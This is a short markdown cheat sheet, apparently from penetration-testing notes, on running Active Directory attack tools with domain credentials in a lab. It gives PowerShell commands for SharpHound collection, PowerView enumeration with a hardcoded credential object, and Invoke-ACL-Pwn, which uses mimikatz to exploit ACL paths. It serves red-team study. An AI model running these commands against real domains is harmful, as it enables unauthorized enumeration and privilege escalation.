# With Domain Creds
## Run SharpHound remotely with creds
```powershell
# the netonly command means creds are only used for network access
runas /netonly /user:lab.local\administrator cmd.exe

# verify we are using the correct creds using
net view \\machine.lab.local\

# run bloodhound remotely, pass -d argument to specify the domain name
C:\tools\SharpHound-v1.0.4 -d "lab.local"
```

## Run PowerView remotely with creds
1. Import powerview
```powershell
import-module .\powerview.ps1
```

2. Setup the credentials object
```powershell
$passwd = ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("lab.local\admin", $passwd)

Get-NetDomainController -Credential $creds 
```

## Run Invoke-ACL-Pwn Remotely with creds
```powershell
# add the -WhatIf flag to view pathes before exploitation
.\Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username 'testuser' -Domain 'xenoflux.local' -Password 'Welcome01!'
```